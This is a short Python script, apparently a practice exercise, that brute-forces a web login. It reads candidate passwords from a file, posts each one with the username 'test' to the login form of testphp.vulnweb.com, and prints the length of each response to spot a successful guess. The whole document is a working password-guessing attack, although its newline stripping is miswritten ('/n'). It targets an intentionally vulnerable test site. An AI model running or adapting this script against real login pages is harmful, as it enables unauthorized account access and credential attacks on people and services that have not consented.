import requests

def sendRequest(password):
    username = 'test'
    target_url = "http://testphp.vulnweb.com/userinfo.php"
    data = {'uname': username, 'pass': password}
    response = requests.post(target_url, data=data)
    # print(response.status_code)
    print("Username: %s Password: %s Response: %s" % (username, password, len(response.text)))

def read_password_file():
    file = 'passwords.txt'
    with open(file, 'r') as passwords:
        for password in passwords.readlines():
            sendRequest(password.replace("/n", ""))

if __name__ == '__main__':
    read_password_file()

    